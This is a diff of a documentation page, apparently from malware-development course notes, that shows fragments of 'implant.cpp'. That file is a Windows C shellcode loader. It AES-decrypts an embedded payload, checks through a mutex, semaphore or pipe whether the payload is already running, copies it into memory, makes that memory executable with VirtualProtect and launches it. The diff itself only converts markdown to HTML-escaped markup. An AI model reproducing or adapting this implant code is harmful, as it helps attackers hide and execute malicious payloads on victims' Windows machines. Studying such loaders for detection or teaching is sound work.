@@ -2,17 +2,16 @@
 
 ### implant.cpp
 
-```c
-#include <winternl.h>
-#include <windows.h>
-#include <tlhelp32.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <wincrypt.h>
+<pre class="language-c"><code class="lang-c">#include &#x3C;winternl.h>
+#include &#x3C;windows.h>
+#include &#x3C;tlhelp32.h>
+#include &#x3C;stdio.h>
+#include &#x3C;stdlib.h>
+#include &#x3C;string.h>
+#include &#x3C;wincrypt.h>
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
-#include <psapi.h>
+#include &#x3C;psapi.h>
 
 
 int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
@@ -20,20 +19,20 @@ int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen
 	HCRYPTHASH hHash;
 	HCRYPTKEY hKey;
 
-	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+	if (!CryptAcquireContextW(&#x26;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
 		return -1;
 	}
-	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &#x26;hHash)) {
 		return -1;
 	}
 	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
 		return -1;
 	}
-	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &#x26;hKey)) {
 		return -1;
 	}
 
-	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
+	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&#x26;payload_len)) {
 		return -1;
 	}
 
@@ -56,8 +55,8 @@ HANDLE hSync;
 #define SEMAPH 3
 #define PIPE 4
 
-BOOL IsPayloadRunning(int method) {
-
+<strong>BOOL IsPayloadRunning(int method) {
+</strong>
 	BOOL ret = FALSE;
 
 	// use global mutant
@@ -127,7 +126,7 @@ int main(void) {
 	RtlMoveMemory(exec_mem, payload, payload_len);
 
 	// Make the buffer executable
-	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &#x26;oldprotect);
 
 	// If all good, launch the payload
 	if (rv != 0) {
@@ -140,4 +139,4 @@ int main(void) {
 }
 
 
-```
+</code></pre>
